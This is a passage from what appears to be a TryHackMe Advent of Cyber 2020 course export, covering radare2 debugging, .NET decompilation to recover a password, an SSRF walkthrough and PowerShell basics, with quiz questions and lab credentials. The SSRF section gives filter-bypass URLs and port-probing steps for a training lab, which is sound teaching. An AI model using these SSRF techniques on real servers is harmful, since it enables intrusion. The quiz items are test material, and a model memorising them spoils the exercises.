style="text-align:left">When dealing with memory manipulation using registers, there are other cases to be considered:</p><ul><li style="text-align:left"><span style="font-size:1rem">(Rb, Ri) = MemoryLocation[Rb + Ri]</span></li><li>D(Rb, Ri) = MemoryLocation[Rb + Ri + D]</li><li>(Rb, Ri, S) = MemoryLocation(Rb + S * Ri]</li><li>D(Rb, Ri, S) = MemoryLocation[Rb + S * Ri + D]</li></ul><p style="text-align:left"><br /></p><p style="text-align:left"><u><span style="font-size:18px">4. Read the instructions!</span></u></p><p style="text-align:left">Some other important instructions are: </p><ul><li style="text-align:left"><i>leaq source, destinatio</i>n: this instruction sets destination to the address denoted by the\nexpression in source\n</li><li style="text-align:left"><i>addq source, destination</i>: destination = destination<b> +</b> source</li><li style="text-align:left"><span style="font-size:1rem"><i>subq source, destination</i>: destination = destination <b>-</b> source</span></li><li style="text-align:left"><i>imulq source, destination</i>: destination = destination <b>*</b> source\n</li><li style="text-align:left"><i>salq source, destination</i>: destination = destination <b>&lt;&lt;</b> source where <b>&lt;&lt; </b>is the left bit shifting\noperator\n</li><li style="text-align:left"><i>sarq source, destination</i>: destination = destination<b> &gt;&gt;</b> source where <b>&gt;&gt;</b> is the right bit\nshifting operator\n</li><li style="text-align:left"><i>xorq source, destination</i>: destination = destination <b>XOR</b> source</li><li style="text-align:left"><span style="font-size:1rem">andq source, destination: destination = destination <b>&amp;</b> source</span></li><li style="text-align:left"><i>orq source, destination</i>: destination = destination <b>|</b> source</li></ul><p style="text-align:left">Now let’s actually walk through the assembly code to see what the instructions mean when\ncombined.</p><p></p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/4.png" style="width:699.559px;height:438.287px" /></p><p>The line starting with\xa0<span style="font-weight:bolder">sym.main</span>\xa0indicates we’re looking at the\xa0<span style="font-weight:bolder">main functio</span>n. The next 3 lines are used to represent the variables stored in the function.\xa0<span style="font-size:1rem">The second column indicates that they are integers(</span><i>int</i><span style="font-size:1rem">), the 3rd column specifies the name that\xa0</span><code style="font-size:14px">r2</code><span style="font-size:1rem">\xa0uses to reference them and the 4th column shows the actual memory location.</span></p><p><span style="font-size:1rem">The first 3 instructions are used to allocate space on that stack (ensures that there’s enough room for variables to be allocated and more). We’ll start looking at the program from the 4th instruction (</span><code style="font-size:14px">movl $4</code><span style="font-size:1rem">). We want to analyse the program while it runs and the best way to do this is by using\xa0<span style="font-weight:bolder">breakpoints</span>.</span></p><p><span style="font-size:1rem">A\xa0<span style="font-weight:bolder">breakpoint</span>\xa0specifies where the program should stop executing. This is useful as it allows us to look at the state of the program at that particular point. So let’s set a breakpoint using the command\xa0</span><code style="font-size:14px">db\xa0</code><span style="font-size:1rem">\xa0in this case, it would be\xa0</span><code style="font-size:14px">db 0x00400b55</code><span style="font-size:1rem">\xa0To ensure the breakpoint is set, we run the\xa0</span><code style="font-size:14px">pdf @main</code><span style="font-size:1rem">\xa0command again and see a little\xa0<span style="font-weight:bolder">b</span>\xa0next to the instruction we want to stop at.</span></p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/5.png" style="width:748.555px;height:290.889px" /></p><p></p><p style="box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-align:left;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial;--darkreader-inline-color:#f0ece5;--darkreader-inline-bgcolor:#1c1e1f"></p><p></p><p style="text-align:center;box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial;--darkreader-inline-color:#f0ece5;--darkreader-inline-bgcolor:#1c1e1f">Now that we’ve set a breakpoint, let’s run the program using\xa0<code style="font-size:14px">dc</code><br /></p><p style="text-align:center;box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial;--darkreader-inline-color:#f0ece5;--darkreader-inline-bgcolor:#1c1e1f"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/6.png" style="width:771.859px;height:362.934px" /></p><p style="text-align:center;box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial;--darkreader-inline-color:#f0ece5;--darkreader-inline-bgcolor:#1c1e1f"><br /></p><p></p><p><span style="font-size:1rem">Running </span><code>dc</code><span style="font-size:1rem"> will execute the program until we hit the breakpoint. Once we hit the breakpoint and print out the main function, the rip which is the current instruction shows where execution has stopped. From the notes above, we know that the\xa0</span><span style="font-size:1rem;font-weight:bolder">mov</span><span style="font-size:1rem">\xa0instruction is used to transfer values.\xa0\xa0</span><span style="font-size:1rem">This statement is transferring the value 4 into the</span><code style="font-size:14px">local_ch</code><span style="font-size:1rem">\xa0variable. To view the contents of the\xa0</span><code style="font-size:14px">local_ch</code><span style="font-size:1rem">\xa0variable, we use the following instruction\xa0</span><code style="font-size:14px">px @memory-address</code><span style="font-size:1rem">\xa0In this case, the corresponding memory address for\xa0</span><code style="font-size:14px">local_ch</code><span style="font-size:1rem">\xa0will be\xa0</span><code style="font-size:14px">rbp-0xc\xa0</code><span style="font-size:1rem">( from the first few lines of\xa0<span style="font-weight:bolder">@pdf main</span>) This instruction prints the values of memory in hex:</span></p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/7.png" style="width:750px" /><span style="font-weight:bolder;text-align:center"><br /></span></p><p><span style="font-weight:bolder;text-align:center"><br /></span></p><p><span style="font-size:1rem">This shows that the variable currently doesn’t have anything stored in it (it’s just </span><b style="font-size:1rem">0000</b><span style="font-size:1rem">).\nLet’s execute this instruction and go to the next one using the following command (which\nonly goes to the next instruction)\n</span><code>ds</code><span style="font-size:1rem">\nIf we view the memory location after running this command, we get the following:</span><br /></p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/8.png" style="width:827.839px;height:433.08px" /></p><p></p><p style="text-align:left">We can see that the first 2 bytes have the value <b>4</b>! If we do the same process for the next\ninstruction, we’ll see that the variable <code>local_8h</code> has the value<b> 5</b>.</p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/9.png" style="width:834.478px;height:433.358px" /><br /></p><span style="font-size:18px">\n</span><p style="text-align:left"><span style="font-size:18px">If we go to the instruction </span><code>movl local_8h, %eax</code><span style="font-size:18px">, we know from the notes that this moves\nthe value from </span><code>local_8h</code><span style="font-size:18px"> to the </span><code>%eax</code><span style="font-size:18px"> register. To see the value of the </span><code>%eax</code><span style="font-size:18px"> register, we\ncan use the command:</span></p><p></p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/10.png" style="width:301.062px;height:492.014px" /><br /></p><p></p><p><br /></p><p>\n</p><p style="text-align:center">If we execute the instruction and run the <code>dr</code>\xa0command again, we get:</p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/11.png" style="width:285.549px;height:205.932px" /><span style="font-weight:bolder;text-align:center;font-size:1rem"><br /></span></p><span style="font-size:18px"> </span><p style="text-align:left">This technically skips the previous instruction <code>movl local_ch, %edx</code> but the same process\ncan be applied to it.\nShowing the value of <i><b>rax</b>\xa0</i>(the 64 bit version) to be <b>5</b>. We can do the same for similar\ninstructions and view the values of the registers changing.\nWhen we come to the <code>addl %edx, %eax</code>, we know that this will add the values in <b>edx</b> and\n<b>eax</b> and store them in <b>eax</b>. Running <code>dr</code> shows us the <b>rax </b>contains <b>5</b> and <b>rdx </b>contains <b>4</b>, so\nwe’d expect <b>rax </b>to contain <b>9 </b>after the instruction is executed:</p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/12.png" style="width:376.563px;height:194.969px" /><span style="font-weight:bolder;text-align:center;font-size:1rem"><br /></span></p><span style="font-size:18px">\n</span><p style="text-align:left">Executing <code>ds</code> to move to the next instruction then executing <code>dr</code> to view register variable\nshows us we are correct:</p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/13.png" style="width:403.437px;height:133.003px" /><span style="font-weight:bolder;text-align:center;font-size:1rem"><br /></span></p><span style="font-size:18px">\n</span><p style="text-align:left">The next few instructions involve moving the values in registers to the variables and vice\nversa:</p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/14.png" style="width:768.168px;height:177.691px" /><span style="font-weight:700;text-align:center;font-size:1rem"><br /></span></p><p style="text-align:center"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-17/2/15.png" style="width:1057.94px;height:119.028px" /><br /></p><span style="font-size:18px">\n</span><p style="text-align:left"><span style="font-size:18px">After that, a string (which is the output is loaded into a register and the </span><code>printf </code><span style="font-size:18px">function is\ncalled in the </span><i>3rd</i><span style="font-size:18px">\n line. The second line clears the value of </span><b>eax </b><span style="font-size:18px">as </span><b>eax </b><span style="font-size:18px">is sometimes used to\nstore results from functions. The </span><i>4th</i><span style="font-size:18px">\n line clears the value of </span><b>eax</b><span style="font-size:18px">. The </span><i>5t</i><span style="font-size:18px">h\n and </span><i>6th</i><span style="font-size:18px">\n lines are\nused to exit the main function.\xa0</span><br /></p><p style="text-align:left"><u><span style="font-size:18px">5. To finalise our workflow...</span></u></p><p style="text-align:left">The general formula for working through something like this is:</p><ol><li style="text-align:left">set appropriate breakpoints\n</li><li style="text-align:left">use ds to move through instructions and check the values of register and memory\n</li><li style="text-align:left">if you make a mistake, you can always reload the program using the <code>ood </code>command</li></ol><p style="text-align:left"><a href="https://scoding.de/uploads/r2_cs.pdf" target="_blank">You may find this radare2 cheatsheet</a> useful in your adventures...</p><p style="text-align:left"><br /></p><p style="text-align:left"><u><span style="font-size:18px">6. Challenge</span></u></p><p style="text-align:left">Use your new-found knowledge of Radare2 to <b>analyse the "challenge1" file</b> in the Instance <code>MACHINE_IP</code> that is attached to this task to answer the questions below.</p><p></p>', 'taskType': 'vm', 'taskNo': 19, 'taskCreated': '2020-11-12T02:49:06.351Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fda55293b4c6d66ab666880', 'questions': [{'questionNo': 1, 'question': 'What is the value of<b> local_ch</b> when its corresponding movl instruction is called (first if multiple)?', 'hint': ''}, {'questionNo': 2, 'question': '<p>What is the value of <b>eax</b> when the imull instruction is called?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>What is the value of <b>local_4h</b> before <b>eax</b> is set to 0?<br /></p>', 'hint': ''}]}, {'taskTitle': '[Day 18] <span class="badge badge-soft-purple size-16">Reverse Engineering</span> The Bits of Christmas', 'taskDesc': '<div><h1><img src="https://dotnet.microsoft.com/static/images/illustrations/swimlane-skills-challenge.svg?v=jawWe3uJF5c_g1QLK31PK5VLeUrqqQc_oRsmEktAOAI" style="width:571.887px;height:269.75px" /></h1><p><a href="https://dotnet.microsoft.com/" target="_blank">(DOTNET Microsoft., 2020)</a></p><h1>Day 18: The Bits of Christmas - Story:</h1><div>"Silly Santa...Forgetting his password yet again!" complains Elf McEager. However, it is in fact Elf McEager who is silly for not creating a way to reset Santa\'s password for the TBFC dashboard.</div><div><br /></div><div>Santa needs to get back into the dashboard for Christmas! Can you help Elf McEager reverse engineer TBFC\'s application to retrieve the password for Santa?!</div><div><br /></div><div><a href="https://www.youtube.com/watch?v=3xPL0vHGKLE&amp;feature=youtu.be" target="_blank">Lost in the depths that is .NET? Follow along with John Hammond for today\'s task.</a></div><div><br /></div><h2>18.1. Getting Started:</h2><p>Before we begin, we\'re going to need to deploy two Instances:</p><ol><li>The THM AttackBox by pressing the "<span style="font-weight:bolder">Start AttackBox</span>" button at the top-right of the page.</li><li>The vulnerable Instance attached to this task by pressing the "<span style="font-weight:bolder">Deploy</span>" button at the top-right of this task/day</li></ol><p>Made with ❤ by\xa0<a href="https://tryhackme.com/">CMNatic</a></p><hr style="border:1px solid var(--main-color)" /></div><div><span style="font-size:1rem">You got your hands dirty with everything that is radare2 yesterday. Today, however, we\'re going to be taking a look at a more interactive approach of disassembling an application.</span></div><div><span style="font-size:1rem"><br /></span></div><div><span style="font-size:1rem">Due to its compatibility and long history, the<a href="https://dotnet.microsoft.com/" target="_blank"> .NET Framework</a> is a popular platform for software developers to develop software with. Anything Windows or web, .NET will cover it.</span></div><div><span style="font-size:1rem"><br /></span></div><div>For example, I developed my answer to Microsoft\'s Calculator in .NET:</div><div><br /></div><div><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-18/1.png" style="width:25%" /></div><div><i><br /></i></div><div><div><div>This is quite a trivial use of .NET, but hey, it works (trust me on this one okay?).\xa0<span style="font-size:1rem">Whilst you may not want to take a look behind the code of <b>this</b> application, there are some that may be of interest such as in the challenge today.\xa0</span><span style="font-size:1rem">Let\'s take a look at the application below:</span><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-18/2.png" style="text-align:center;font-size:1rem;width:50%" /></div></div></div><div><br /></div><div>When running the application, we are asked for an input (in this case a Username). This begs the question, how does the application know what username/password is right or wrong? The application must know the answer...<span style="font-size:1rem">Applications that are created using the\xa0 .NET framework can be disassembled using tools such as <a href="https://github.com/icsharpcode/ILSpy" target="_blank">ILSpy</a> or <a href="https://www.jetbrains.com/decompiler/" target="_blank">Dotpeek</a>.</span></div><div><i><br /></i></div><div>Loading our calculator application into ILSpy verifies that it is indeed a .NET application:</div><div><br /></div><div><br /></div><div><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-18/new/1.png" style="width:1076.02px" /><br /></div><div><br /></div><div><i><br /></i></div><div><i>After expanding some of the resources, we can see references to elements of the application such as buttons, labels and the likes:</i></div><div><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-18/new/2.png" style="width:494.284px;height:549.858px" /><i><br /></i></div><div><br /></div><div><i><br /></i></div><div>When looking through the objects, ILspy has helpfully been able to recreate what some of the source code behind the application is:<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-18/5.png" style="width:767.284px;height:519.981px" /></div><div><i><br /></i></div><div>Because it\'s a calculator, we can see the c++ code that checks for mathematical operators (plus, minus, multiply and divide).\xa0<span style="font-size:1rem">Looking through other objects reveals similar code (of that we\'d expect of a Calculator at least).</span></div><div><i><br /></i></div><div><h2>18.3. Challenge:</h2><p><span style="font-size:1rem"><b>Deploy the instance attached to this task</b> and log in using the Remote Desktop Protocol (RDP).\xa0</span><span style="font-size:1rem">Open the application "TBFC_APP.exe" on the Desktop and enter the correct password!</span></p><div>You can use "Remmina" on the TryHackMe AttackBox to connect to the instance with the following credentials, or any RDP client such as Microsofts if you wish to connect to the <a href="https://tryhackme.com/room/openvpn" target="_blank">TryHackMe VPN</a>:</div><p><b style="font-size:1rem">IP Address</b><span style="font-size:1rem">: </span><code>MACHINE_IP</code><br /></p><p><b>Username</b>: cmnatic</p><p><b>Password</b>: Adventofcyber!<span style="font-size:1rem">\xa0</span></p><p>1.Navigate to the "Applications" tab on the AttackBox where "Remmina" is located in the "Internet" sub-menu.\xa0</p><p>\xa0<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-18/rem/1.png" style="width:519px;height:349.343px" /></p><p>2. Reminna will ask you for a password to save sessions, we can safely press "Cancel":</p><p>\xa0<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-18/rem/2.png" style="width:711px" /></p><p>3. Now fill out the IP address of the target Instance that you have deployed, input the Username and password provided and set your "Color depth" to "RemoteFX (32 bpp) like so:</p><p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-18/rem/3.png" style="width:1076px" /></p><p><span style="font-weight:bolder;font-size:1rem">IP Address</span><span style="font-size:1rem">:\xa0</span><code style="font-size:14px">MACHINE_IP</code><br /></p><p><span style="font-weight:bolder">Username</span>: cmnatic</p><p style="margin-bottom:1rem"><span style="font-weight:bolder">Password</span>: Adventofcyber!<span style="font-size:1rem">\xa0</span></p><p style="margin-bottom:1rem"><span style="font-size:1rem"><br /></span></p><p style="text-align:center;margin-bottom:1rem"><span style="font-size:1rem"><i>As this is a Windows box, <b>please allow a comfortable five minutes for it to fully set up</b>. Grab some water (into a container, please, unless you\'re a water bender. If you are in fact, why are you reading this task?) and do a quick posture check.</i></span></p></div><div><hr style="text-align:center" /></div><div><b>Want to get more hands-on with disassembling applications on Windows?</b> Check out <a href="https://tryhackme.com/p/cmnatic" target="_blank">my</a> Malware Analysis primer:</div><div>1.\xa0<a href="https://tryhackme.com/room/malmalintroductory" target="_blank">Malware Analysis Primer</a>\xa0- learning and visualising the characteristics of malware.</div><div>2.\xa0<a href="https://tryhackme.com/room/malremnuxv2" target="_blank">MAL: REMnux - The Redux</a>\xa0- Using <a href="https://remnux.org/" target="_blank">REMnux</a> to analyse malicious PDFs and the memory dump of a machine infected with the <a href="https://www.bleepingcomputer.com/news/security/jigsaw-ransomware-decrypted-will-delete-your-files-until-you-pay-the-ransom/" target="_blank">Jigsaw Ransomware.</a>\xa0\xa0</div>', 'taskType': 'vm', 'taskNo': 20, 'taskCreated': '2020-11-12T02:49:13.283Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fdba63a413dd36d5fddfa5c', 'questions': [{'questionNo': 1, 'question': '<p>Open the "TBFC_APP" application in ILspy and begin decompiling the code<br /></p>\n', 'hint': 'An alternative tool "Dotpeek" has been provided, you may find this more intuitive to use. '}, {'questionNo': 2, 'question': "<p>What is Santa's password?<br /></p>", 'hint': 'Recall that applications asking for credentials must know the correct credentials in the first place, try to find the correct password for Santa!\n'}, {'questionNo': 3, 'question': "<p>Now that you've retrieved this password, try to login...What is the flag?<br /></p>", 'hint': ''}]}, {'taskTitle': '[Day 19] <span class="badge badge-soft-danger size-16">Web Exploitation</span> The Naughty or Nice List', 'taskDesc': '<p>Santa has released a web app that lets the children of the world check whether they are currently on the naughty or nice list. Unfortunately, the elf who coded it exposed more things than she thought. Can you access the list administration and ensure that every child gets a present from Santa this year?<br /></p><p>Feel free to try hacking this web app on your own, or follow the instructions below! Note: when bypassing the hostname filter, use localtest.me otherwise your attempts won\'t work!</p><p>Can\'t bypass the naughty or nice list yourself?<a href="https://www.youtube.com/watch?v=XgJ_6xdspKM&amp;feature=youtu.be" target="_blank"> Watch the creator</a> (<a href="https://twitter.com/TibSec" target="_blank">@Tib3rius</a>) solve today\'s challenge.!</p><h2>Server-Side Request Forgery</h2><p>Server-Side Request Forgery (SSRF) is a web app vulnerability that allows attackers to force the web application server to make requests to resources it normally wouldn\'t. For example, a web app may have the functionality to produce screenshots of other websites when a user supplies a URL. This is perfectly valid functionality, however, URLs can also be made for internal IP addresses (e.g. 192.168.1.1, 10.10.10.10, 127.0.0.1 etc.) as well as internal-only hostnames (e.g. localhost, WIN2019SERV.CORP). If a web developer is not careful, an attacker could provide the app with these and manage to screenshot internal resources, which often have less protections.</p><p>To counter this, user-provided URLs can be checked before they are requested, to ensure that malicious values are not being used. However, due to the complex nature of URLs themselves, there are often many things an attacker can do to bypass these checks.</p><p>Note that while the example of SSRF used in this task is effectively a Remote File Inclusion (RFI) vulnerability as well, not every SSRF is. Some SSRF vulnerabilities only trigger a DNS lookup, while others may not return any kind of response to the web app, but can still be used to "port scan" internal systems by measuring the time each request takes to complete. In other cases, SSRF may be used as a form of Denial of Service (DoS) since the attacker can continually request that the server download large files simultaneously (taking up memory, disk space, and network bandwidth).<br /></p><h2>Walkthrough</h2><ol><li>Once the VM is deployed, connect to the web app:\xa0<a href="http://machine_ip/" target="_blank">http://MACHINE_IP</a><a href="http://machine_ip/" target="_blank"></a><br /><br /></li><li>Enter a name in the form and click the "Search" button. When the page loads, it should tell you whether that name is on the Naughty List or the Nice List. Notice that the URL for the page looks something like this:\xa0<a href="http://machine_ip/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3DTib3rius" target="_blank">http://MACHINE_IP/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3DTib3rius</a><br /><br />If we use a URL decoder on the value of the "proxy" parameter, we get:\xa0http://list.hohoho:8080/search.php?name=Tib3rius<br /><br />Since "list.hohoho" is not a valid hostname on the Internet (.hohoho is not a\xa0<a href="https://en.wikipedia.org/wiki/List_of_Internet_top-level_domains" target="_blank">top-level domain</a><span style="font-size:1rem">), this hostname likely refers to some back-end machine. It seems that the web app works by taking this URL, making a request at the back-end, and then returning the result to the front-end web app. If the developer has not been careful, we may be able to exploit this functionality using Server-Side Request Forgery (SSRF).<br /><br /></span></li><li>The most obvious thing we can try to do first is to fetch the root of the same site. Browse to:\xa0<a href="http://machine_ip/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2F" target="_blank">http://MACHINE_IP/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2F</a><span style="font-size:1rem">\xa0<br /></span><br />This seems to have potential, as in place of the original "Tib3rius is on the Nice List." message, we instead see "Not Found.\xa0<span style="font-size:1rem">The requested URL was not found on this server." This seems like a generic 404 message, indicating that we were able to make the server request the modified URL and return the response.<br /></span><br />There are many things we could do now, such as trying to find valid URLs for the "list.hohoho" site. We could also try changing the port number from 8080 to something else, to see if we can connect to any other services running on the host, even if these services are not web servers.<br /><br /></li><li>Try changing the port number from 8080 to just 80 (the default HTTP port):\xa0<a href="http://machine_ip/?proxy=http%3A%2F%2Flist.hohoho%3A80" target="_blank">http://MACHINE_IP/?proxy=http%3A%2F%2Flist.hohoho%3A80</a><br /><br />The message now changes to "Failed to connect to list.hohoho port 80: Connection refused" which suggests that port 80 is not open on list.hohoho.<br /><br /></li><li>Try changing the port number to 22 (the default SSH port):\xa0<a href="http://machine_ip/?proxy=http%3A%2F%2Flist.hohoho%3A22" target="_blank">http://MACHINE_IP/?proxy=http%3A%2F%2Flist.hohoho%3A22</a><br /><br />The message now changes to "Recv failure: Connection reset by peer" which suggests that port 22 is open but did not understand what was sent (this makes sense, as sending an HTTP request to an SSH server will not get you anywhere!)<br /><br />Enumerating open ports via SSRF can be performed in this manner, by iterating over common ports and measuring the differences between responses. Even in cases where error messages aren\'t returned, it is often possible to detect which ports are open vs closed by measuring the time each request takes to complete.<br /><br /></li><li>Another thing we can try to do with SSRF is access services running locally on the server. We can do this by replacing the list.hohoho hostname with "localhost" or "127.0.0.1" (among others). Try this now:\xa0<a href="http://machine_ip/?proxy=http%3A%2F%2Flocalhost" target="_blank">http://MACHINE_IP/?proxy=http%3A%2F%2Flocalhost</a><br /><br />Oops! It looks like the developer has a check in place for this, as the message returned says "Your search has been blocked by our security team."<br /><br />Indeed, if you try other hostnames (e.g. 127.0.0.1, example.com, etc.) they will all be blocked. The developer has implemented a check to ensure that the hostname provided starts with "list.hohoho", and will block any hostnames that don\'t.<br /><br /></li><li>As it turns out, this check can easily be bypassed. Since the hostname simply needs to start with "list.hohoho", we can take advantage of DNS subdomains and create our own domain "list.hohoho.evilsite.com" which resolves to 127.0.0.1. In fact, we don\'t even need to buy a domain or configure the DNS, because multiple domains already exist that let us do this. The one we will be using is localtest.me, which resolves every subdomain to 127.0.0.1.<br /><br />We can therefore set the hostname in the URL to "list.hohoho.localtest.me", bypass the check, and access local services:\xa0<a href="http://machine_ip/?proxy=http%3A%2F%2Flist.hohoho.localtest.me" target="_blank">http://MACHINE_IP/?proxy=http%3A%2F%2Flist.hohoho.localtest.me</a><a href="http://machine_ip/?proxy=http%3A%2F%2Flist.hohoho.localtest.me" target="_blank"></a><br /><br />Success! It appears that there is a web server running locally, and it has a message from Elf McSkidy that contains some sensitive information we can use!<br /><br /><a href="http://machine_ip/?proxy=http%3A%2F%2Flist.hohoho.localtest.me" target="_blank"></a></li><li>Click the "Admin" link at the top or scroll down to the login. Guess the username and use the password you found to login as Santa.<br /><br /></li><li>Delete the naughty list to find the challenge flag!</li></ol>\n', 'taskType': 'vm', 'taskNo': 21, 'taskCreated': '2020-11-12T02:49:26.061Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fbacb0b2ab75116b0814667', 'questions': [{'questionNo': 1, 'question': "<p>What is Santa's password?<br /></p>\n", 'hint': ''}, {'questionNo': 2, 'question': '<p>What is the challenge flag?<br /></p>', 'hint': ''}]}, {'taskTitle': '[Day 20] <span class="badge badge-soft-primary size-16">Blue Teaming</span> PowershELlF to the rescue', 'taskDesc': '<p>Someone is mischievous at The Best Festival Company. The contents within the stockings have been removed. A clue was left in one of the stockings that hints that the contents have been hidden within Elfstation1. McEager moves quickly and attempts to RDP into the machine. Yikes! He is unable to log in.</p><p>Luckily, he has been learning PowerShell, and he can remote into the workstation using\xa0<span style="font-weight:bolder">PowerShell over SSH</span>.</p><p><span style="font-weight:bolder">Task</span>: Use the PowerShell console to navigate throughout the endpoint to find the hidden contents to reveal what was hidden in the stockings.</p><p><a href="https://www.youtube.com/watch?v=LrdT2hUM6mw&amp;feature=emb_title&amp;ab_channel=JohnHammond" target="_blank">Watch JohnHammond\'s video on solving this task!</a><br /></p><hr style="border:1px solid var(--main-color)" /><p>You will use SSH to connect to the remote machine.</p><p>The command to run to connect to the remote machine:\xa0<code style="font-size:14px">ssh -l mceager MACHINE_IP</code></p><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/winrm1c.png" alt /></p><p>Note that your IP address will be different. When prompted, enter the password:\xa0<code style="font-size:14px">r0ckStar!</code></p><p>If you logged in successfully, you will see the following prompt.</p><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/winrm2c.png" alt /></p><p>Before we begin, launch PowerShell and navigate to the Documents folder.</p><p><img src="https://assets.tryhackme.com/additional/sam-aoc2020/powershell.png" alt /><br /><img src="https://assets.tryhackme.com/additional/sam-aoc2020/documents2.png" alt /><br /><span style="font-weight:bolder">Note</span>: The virtual machine may take up to 3 minutes to load.</p><hr style="border:1px solid var(--main-color)" /><p>The official explanation of PowerShell is: "PowerShell is a cross-platform task automation and configuration management framework, consisting of a command-line shell and scripting language. Unlike most shells, which accept and return text, PowerShell is built on top of the .NET Common Language Runtime (CLR), and accepts and returns .NET objects. This fundamental change brings entirely new tools and methods for automation."</p><p>PowerShell has grown in popularity in the last few years among defenders and especially attackers. Knowing PowerShell is a necessary skill. If you have only heard of PowerShell but never dabbled with it, fret not, today you will.</p><p>Recall from the definition above that PowerShell is a command-line shell. We must enter commands into the command prompt to instruct PowerShell on what we want it to do for us. PowerShell commands are known as cmdlets.</p><p>To list the contents of the current directory we are in, we can use the\xa0<code style="font-size:14px">Get-ChildItem</code>\xa0cmdlet.\xa0 There are various other options we can use with this cmdlet to enhance its capabilities further.</p><ul><li><code style="font-size:14px">-Path</code>\xa0Specifies a path to one or more locations. Wildcards are accepted.</li><li><code style="font-size:14px">-File / -Directory</code>\xa0To get a list of files, use the File parameter. To get a list of directories, use the Directory parameter. You can use the Recurse parameter with File and/or Directory parameters.</li><li><code style="font-size:14px">-Filter</code>\xa0Specifies a filter to qualify the Path parameter.</li><li><code style="font-size:14px">-Recurse</code>\xa0Gets the items in the specified locations and in all child items of the locations.</li><li><code style="font-size:14px">-Hidden</code>\xa0To get only hidden items, use the Hidden parameter.</li><li><code style="font-size:14px">-ErrorAction SilentlyContinue</code>\xa0Specifies what action to take if the command encounters an error.</li></ul><p>For example, if you want to view all of the hidden files in the current directory you are in, you can issue the following command:\xa0<code style="font-size:14px">Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue</code></p><p>Another useful cmdlet is\xa0<code style="font-size:14px">Get-Content</code>. This will allow you to read the contents of a file.</p><p>You can run this command as follows:\xa0<code style="font-size:14px">Get-Content -Path file.txt</code></p><p>You can run numerous operations with the\xa0<code style="font-size:14px">Get-Content</code>\xa0cmdlet to give you more information about the particular file you are inspecting. Such as how many words are in the file and the exact positions for a particular string within a file.</p><p>To get the number of words contained within a file, you can use the\xa0<code style="font-size:14px">Get-Content</code>\xa0cmdlet and\xa0<span style="font-weight:bolder">pipe</span>\xa0the results to the\xa0<code style="font-size:14px">Measure-Object</code>\xa0cmdlet.</p><p>You run this command as follows:\xa0<code style="font-size:14px">Get-Content -Path file.txt | Measure-Object -Word</code></p><p>To get the exact position of a string within the file, you can use the following command:\xa0\xa0<code style="font-size:14px">(Get-Content -Path file.txt)[index]</code></p><p>The index is the numerical value that is the location of the string within the file. Since indexes start at zero, you typically need to subtract one from the original value to extract the string at the correct position.\xa0<span style="font-weight:bolder">This is not necessary for this exercise</span>.</p><p>To change directories, you can use the\xa0<code style="font-size:14px">Set-Location</code>\xa0cmdlet.</p><p>For example,\xa0<code style="font-size:14px">Set-Location -Path 